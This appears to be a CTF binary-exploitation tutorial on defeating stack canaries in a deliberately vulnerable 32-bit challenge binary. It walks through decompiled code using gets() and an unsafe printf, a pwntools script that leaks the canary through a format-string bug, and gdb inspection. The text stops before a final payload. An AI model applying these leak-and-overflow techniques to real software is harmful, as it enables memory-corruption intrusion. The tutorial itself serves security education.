---
description: 09/14/2023
---

# üè¥‚ò† Bypass Stack Canaries (Leak + Write)

## Introduction

In this tutorial, we will be <mark style="color:yellow;">defeating stack canaries, a common mitigation technique for buffer overflows</mark>.

However, just like anything else, we can bypass them with the right effort and determination!

#### Also check out:

{% content-ref url="memory-protections/stack-canaries.md" %}
[stack-canaries.md](memory-protections/stack-canaries.md)
{% endcontent-ref %}

### Video Reference

{% embed url="https://www.youtube.com/watch?v=TOImpHQvmpo&list=PLHUKi1UlEgOIc07Rfk2Jgb5fZbxDPec94&index=12&ab_channel=CryptoCat" %}

### Binary Target and Other Files

{% embed url="https://github.com/Crypto-Cat/CTF/tree/main/pwn/binary_exploitation_101/10-bypassing_canaries" %}

## Enumeration

`file`:

{% code overflow="wrap" %}
```
canary: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=9ecec437cdaead3327c28ef59456895c8ee89dd9, for GNU/Linux 3.2.0, not stripped
```
{% endcode %}

* 32-bit ELF binary
* Dynamically linked to `libc`
* Non-stripped

`checksec`:

```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

## Messing with the Binary

<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

So, it appears that our long string does not impact the first input of the program, however the stack canary prevents us from inputting our string in the second input.

## Reversing

Throw the target binary into Ghidra.

I immediately noticed that this is a **ret2win** challenge because we were missing a function inside of `main()`.

Also, this allows us to simply focus strictly on bypassing the canary protection itself.

`main()`:

```c
undefined4 main(void)

{
  int iVar1;
  undefined4 uVar2;
  int in_GS_OFFSET;
  
  iVar1 = *(int *)(in_GS_OFFSET + 0x14);
  vuln();
  uVar2 = 0;
  if (iVar1 != *(int *)(in_GS_OFFSET + 0x14)) {
    uVar2 = __stack_chk_fail_local();
  }
  return uVar2;
}
```

`vuln()`:

```c
void vuln(void)

{
  int in_GS_OFFSET;
  char local_50 [64];
  int local_10;
  
  local_10 = *(int *)(in_GS_OFFSET + 0x14);
  puts("You\'ll never beat my state of the art stack protector!");
  gets(local_50);
  printf(local_50);
  puts("\nWho said gets() is dangerous? Good luck with your BOF attack :P");
  gets(local_50);
  if (local_10 != *(int *)(in_GS_OFFSET + 0x14)) {
    __stack_chk_fail_local();
  }
  return;
}
```

`hacked()`:

```c
void hacked(void)

{
  int iVar1;
  int in_GS_OFFSET;
  
  iVar1 = *(int *)(in_GS_OFFSET + 0x14);
  puts("Wait, how did you get in here?!");
  if (iVar1 != *(int *)(in_GS_OFFSET + 0x14)) {
    __stack_chk_fail_local();
  }
  return;
}
```

### Identifying the Canary in Ghidra

Inside of our `main()` function, I have modified the variable to identify the canary better.

Essentially, `in_GS_OFFSET` will simply generate a random value and it will call `vuln()`.&#x20;

If you were overflowing the buffer and arrived at the `vuln()` call, and then upon returning, if the canary is not equal to what it was originally set to, it will call `__stack_chk_fail_local()`, resulting in a stack smashing error, crashing the program.

<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption><p><code>main()</code></p></figcaption></figure>

<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption><p><code>vuln()</code></p></figcaption></figure>

<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

Upon viewing the stack, we can see that we have our return pointer on the stack (`AL:1`), our local\_8, and then our canary itself.

In other words, our canary will be 64-bytes in judging from our buffer, 12 bytes after we write the 4-byte canary in order to get to the return address.

## Identifying the Canary

We can do this by fuzzing the program if there is a format string bug to leak the canary.

**Keep in mind**:&#x20;

<mark style="color:yellow;">The canary value is very random, will not start with f7/ff, and will end with 00 usually</mark>.

You will want to run this script a few times and look for elements off of the stack that are changing and randomized each time the program is run.

`fuzz.py`:

```python
from pwn import *

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF('./canary', checksec=False)

# Let's fuzz x values
for i in range(100):
    try:
        # Create process (level used to reduce noise)
        p = process(level='error')
        # Format the counter
        # e.g. %2$s will attempt to print [i]th pointer/string/hex/char/int
        p.sendline('%{}$p'.format(i).encode())
        p.recvline()
        # Receive the response
        result = p.recvline().decode()
        # If the item from the stack isn't empty, print it
        if result:
            print(str(i) + ': ' + str(result).strip())
    except EOFError:
        pass
```

<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption><p>Upon running this a few times, this was the only element to be randomized and meet the criteria explained above.</p></figcaption></figure>

However, we can also use `gdb` to find this information.

<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

Obtaining `vuln()`'s address, viewing it's disassembly, breaking at it's `printf()`, running the program, using canary to view valid canaries on the stack, and printing 100 values in hex on the stack will allow us to be able to view the canaries on the stack as values.

We can see that we start from 0 and we count 24 elements on the stack (meaning our canary can be seen in the 23rd element of the stack).

Going back to our `fuzz.py`, we can see that this value in the 23rd element on the stack seems highly likely to be our canary. Keep in mind it will keep changing with each execution.

